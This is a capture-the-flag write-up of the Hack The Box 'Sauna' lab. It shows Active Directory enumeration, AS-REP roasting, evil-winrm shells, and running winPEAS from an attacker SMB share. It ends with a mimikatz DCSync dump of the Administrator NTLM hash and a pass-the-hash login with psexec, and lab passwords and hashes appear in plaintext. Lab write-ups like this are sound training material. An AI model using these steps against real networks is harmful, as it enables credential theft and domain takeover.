
# SAUNA

## Initial Scan

First I do the normal nmap scan on the IP address 10.10.10.175

```
$nmap -sS -sV -sC 10.10.10.175
```

![](Pictures/nmao_scan_inittian.png)

After that do the all ports scan:

![](Pictures/nmap_scan_all_ports.png)

This shows us that the server is running ldap and kerberos

## Trying out common Active Directory Attacks

First I had to get the naming contexts of the AD

```
ldapsearch -h 10.10.10.175 -x -s base namingcontexts
```

The following is the output:

![](Pictures/getting_naming_contexts.png)

Then trying out the domain controller to see if I get anything

![](Pictures/getting_naming_contexts.png)

We can find that there is a user called, Hugo Smith. After that I tried doing null authentication using rpcclient but it was of no use, because the null authentication doesn't have any permissions to enumerate the users of the server..

```
rpcclient -U '' 10.10.10.175

>enumdomusers
```
This will result in permission denied. So to find the users I took a look at the impacket tools. I would suggest you to download the latest version of the impacket tools from GitHub.

I used the GetNPUsers.py script to check for any usernames. But it didn't work without the username. So I had to guess the username for the server. I used cewl and jotted down the usernames that the website could provide.

![](Pictures/potential_users.png)

These are the potential users that I thought there could be. So, I manually made a combination of the names of these users using the popular AD Formats.

```
NameSurname, Name.Surname, NamSur(3 letters of each) , Nam.Sur, NSurname, N.Surname, SurnameName, Surname.Name, SurnameN, Surname.N
```
After creating the names list, I bruteforced using the GetNPUsers.py script. 

```
./GetNPUsers.py -dc-ip 10.10.10.175 -no-pass -request 'egotisticalbank/' -usersfile ~/sauna/names.txt
```
![](Pictures/getting_creds.png)

We see that we get the creds for the user FSmith. Although I found out that AD is not case sensitive, so it won't matter while logging in. 

## Using winrm to spawn a shell

Since, it is running winrm, we can use evil-winrrm to spawn a Powershell.

```
evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
```

```
evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop>
```

Thus, we see that we have pwned the user shell.


## Onto Root

For Windows priviledge esacalation, copy and paste the winPEAS.exe to an smb folder in your working directory where you want to start the smb share.

First start the impacket-smbserver 

```
sudo impacket-smbserver ThatsmaServer $(pwd) -smb2support -user dosxuz -password ThisisME
```

Then put the password and Server name in a Credential Object.

```
$pass = convertto-securestring 'ThisisME' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dosxuz',$pass)

```

Now we have a credential object.
After this we will create a new PSDrive
```
New-PSDrive -Name dosxuz -PSProvider FileSystem -Credential $cred -Root \\10.10.14.246\ThatsmaServer
```

Then we can move into our own directory in the server.

```
cd dosxuz:
```
**Adding the colon (:) is important as it changes the Drive**

After that I ran the winPEAS.exe for enumeration. I looked for some autologon creds in the server.

```
dosxuz:>.\winPEAS.exe
                                                                                                                                                                                             
  [+] Looking for AutoLogon credentials(T1012)                                                                                                                                                 
    Some AutoLogon credentials were found!!    
    DefaultDomainName             :  EGOTISTICALBANK                                                                                                                                           
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager                                                                                                                           
    DefaultPassword               :  Moneymakestheworldgoround!                                                                                                                                
```

So the creds for teh svc_loanmgr (the service account) : 
```
svc_loanmanager : Moneymakestheworldgoround!                                                                                                                                
```

So, I again used the evil-winrm to login as svc_loanmgr :  

```
evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
```

I had to create another connection for this user as well. I cloned the mimikatz github repository and transfered the mimikatz.exe to the target box. Then I ran the DCSync attack using mimikatz.

```
                                                                                                                                                        
*Evil-WinRM* PS C:\Users\svc_loanmgr> .\mimikatz.exe "lsadump::dcsync /user:Administrator" exit                                                                                                
                                                                                                                                                                                               
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36                                                                                                                                   
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                                                    
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                       
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                                                                         
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                                                      
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                                                                      
                                                                                                                                                                                               
mimikatz(commandline) # lsadump::dcsync /user:Administrator                                                                                                                                    
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain                                                                                                                                               
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server                                                                                                                                      
[DC] 'Administrator' will be the user account                                                                                                                                                  
                                                                                                                                                                                               
Object RDN           : Administrator                                                                                                                                                           
                                                                                                                                                                                               
** SAM ACCOUNT **                                                                                                                                                                                                                                                                                                                                                                             SAM Username         : Administrator                                                                                                                                                           
Account Type         : 30000000 ( USER_OBJECT )                                                                                                                                                
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )                                                                                                                          
Account expiration   :                                                                                                                                                                         
Password last change : 1/24/2020 10:14:15 AM                                                                                                                                                   
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500                                                                                                                           
Object Relative ID   : 500                                                                                                                                                                     
                                                                                                                                                                                               
Credentials:                                                                                                                                                                                   
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff                                                                                                                                                  
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff                                                                                                                                                  
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f                                                                                                                                                  
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211                 
```

So I got the NTLM hashes for the Administrator and now I can use crackmapexec and then psexec to pwn the admin.

```
crackmapexec smb 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff                                                                                                                                                  
```

It will say that the user is Pwn3d! then we can use psexec.py

```
psexec -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
```

![](Pictures/admin.png)

